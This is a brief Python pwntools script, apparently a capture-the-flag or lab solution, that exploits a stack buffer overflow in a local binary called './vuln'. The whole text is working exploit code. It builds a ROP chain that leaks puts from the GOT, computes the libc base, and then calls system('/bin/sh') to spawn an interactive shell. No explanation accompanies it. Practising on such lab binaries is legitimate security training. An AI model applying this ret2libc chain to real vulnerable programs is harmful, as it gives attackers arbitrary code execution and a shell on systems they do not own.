from pwn import *

p = process("./vuln")
elf = ELF("./vuln")
libc = elf.libc
rop = ROP(elf)

putsPLT = elf.plt['puts']
putsGOT = elf.got['puts']
mainAddr = elf.symbols['main']

junk = b'a'*40
popRDI = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = 0x401016
payload = junk + p64(popRDI) + p64(putsGOT) + p64(putsPLT) + p64(mainAddr)
p.recv()
p.sendline(payload)
putsAddr = u64(p.recvline().strip().ljust(8, b"\x00"))

libcBase = putsAddr - libc.symbols['puts']
systemAddr = libcBase + libc.symbols['system']
shedllAddr = libcBase + next(libc.search(b"/bin/sh"))

payload2 = junk + p64(popRDI) + p64(shedllAddr) + p64(ret) + p64(systemAddr)
p.sendline(payload2)

p.interactive()
